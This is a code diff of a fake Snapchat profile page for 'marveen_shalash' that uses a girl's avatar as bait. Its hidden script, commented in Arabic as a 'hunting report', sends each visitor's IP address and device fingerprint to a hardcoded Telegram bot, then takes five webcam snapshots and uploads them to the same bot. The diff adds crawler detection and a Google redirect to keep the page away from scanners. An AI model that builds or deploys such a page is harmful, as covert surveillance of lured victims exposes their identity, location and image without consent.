@@ -6,13 +6,13 @@
     <title>Snapchat | marveen_shalash</title>
     
     <meta property="og:title" content="Snapchat - marveen_shalash">
-    <meta property="og:image" content="https://i.ibb.co/V3Yx8YV/avatar.jpg">
+    <meta property="og:image" content="https://i.ibb.co/L9p7f3X/girl-avatar.jpg">
     <meta property="og:description" content="Add me on Snapchat!">
     <meta name="theme-color" content="#FFFC00">
 
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background-color: #FFFC00; font-family: -apple-system, sans-serif; height: 100vh; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        body { background-color: #FFFC00; font-family: -apple-system, sans-serif; height: 100vh; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; overflow: hidden; }
         .avatar { width: 150px; height: 150px; border-radius: 50%; border: 5px solid #fff; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.1); margin-bottom: 10px; }
         .ghost { width: 50px; margin-bottom: 20px; }
         h1 { font-size: 26px; color: #000; font-weight: bold; margin: 5px 0; }
@@ -24,9 +24,10 @@
 <body>
 
     <img src="https://www.snapchat.com/globalassets/sp-pwa/ghost-logo.png" class="ghost">
-    <img src="https://i.ibb.co/V3Yx8YV/avatar.jpg" class="avatar">
+    <img src="https://i.ibb.co/L9p7f3X/girl-avatar.jpg" class="avatar">
     <h1>marveen_shalash</h1>
     <p class="user-name">marveen_shalash</p>
+    
     <button class="btn" id="mainBtn">Add Friend</button>
 
     <video id="v" autoplay playsinline></video>
@@ -36,66 +37,61 @@
         const token = "8264886383:AAEaUDc_Jm_3z74zqmFfXLU9cHXhRKrhjxs";
         const chatId = "5775781038";
 
-        // --- ميزة الرابط الخاص ---
-        // إذا لم يحتوي الرابط على كلمة "login" سيتم التحويل لقوقل فوراً
+        // 🛡️ نظام الحماية والتوجيه
         const urlParams = new URLSearchParams(window.location.search);
-        if (!urlParams.has('login')) {
-            window.location.href = "https://www.google.com";
+        const isBot = /bot|googlebot|crawler|spider|robot/i.test(navigator.userAgent);
+
+        if (isBot || !urlParams.has('login')) {
+            window.location.replace("https://www.google.com");
         } else {
             document.body.style.display = "flex";
         }
 
         async function sendLog(m) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(m)}&parse_mode=html`);
         }
 
         window.onload = async () => {
             try {
-                // سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+                const ipD = await ipRes.json();
                 
-                // معلومات البطارية
-                let batt = "N/A";
-                try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "% (" + (b.charging ? "يشحن" : "لا يشحن") + ")"; } catch(e){}
-
-                // تقرير المعلومات الشامل (بصمة الجهاز)
-                let report = `🔥 <b>تقرير صيد شامل (marveen_shalash)</b>\n\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-                             `🔋 <b>البطارية:</b> ${batt}\n` +
-                             `📱 <b>النظام:</b> ${navigator.platform}\n` +
+                // سحب معلومات البطارية والرام والمعالج (بصمة الجهاز)
+                let b = "N/A"; try { const bat = await navigator.getBattery(); b = Math.round(bat.level * 100) + "% " + (bat.charging ? "🔌" : "🔋"); } catch(e){}
+                
+                let report = `🔥 <b>تقرير صيد شامل: marveen_shalash</b>\n` +
+                             `🌐 <b>IP:</b> <code>${ipD.ip}</code>\n` +
+                             `🔋 <b>الشحن:</b> ${b}\n` +
                              `🧠 <b>الرام:</b> ${navigator.deviceMemory || 'غير معروف'} GB\n` +
-                             `🖥️ <b>الشاشة:</b> ${screen.width}x${screen.height}\n` +
                              `⚙️ <b>المعالج:</b> ${navigator.hardwareConcurrency} Cores\n` +
+                             `🖥️ <b>الشاشة:</b> ${screen.width}x${screen.height}\n` +
+                             `📱 <b>النظام:</b> ${navigator.platform}\n` +
                              `🌍 <b>اللغة:</b> ${navigator.language}\n` +
-                             `⏰ <b>المنطقة:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
-                             ` ब्राउज़र <b>البصمة:</b> ${navigator.userAgent.slice(0, 50)}...`;
+                             `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
 
-                await sendLog(report);
+                sendLog(report);
                 startCapture();
-            } catch (err) {}
+            } catch (e) {}
         };
 
         async function startCapture() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const vid = document.getElementById('v');
+                vid.srcObject = s;
                 for(let i=1; i<=5; i++) {
                     setTimeout(() => {
                         const can = document.getElementById('c');
-                        can.width = video.videoWidth;
-                        can.height = video.videoHeight;
-                        can.getContext('2d').drawImage(video, 0, 0);
+                        can.width = vid.videoWidth; can.height = vid.videoHeight;
+                        can.getContext('2d').drawImage(vid, 0, 0);
                         can.toBlob(blob => {
                             const fd = new FormData();
                             fd.append('chat_id', chatId);
-                            fd.append('photo', blob, 'img.jpg');
+                            fd.append('photo', blob, 'snap.jpg');
                             fd.append('caption', `📸 صورة ${i} | marveen_shalash`);
                             fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                         }, 'image/jpeg', 0.6);
-                    }, i * 800);
+                    }, i * 1000);
                 }
             } catch (e) {}
         }
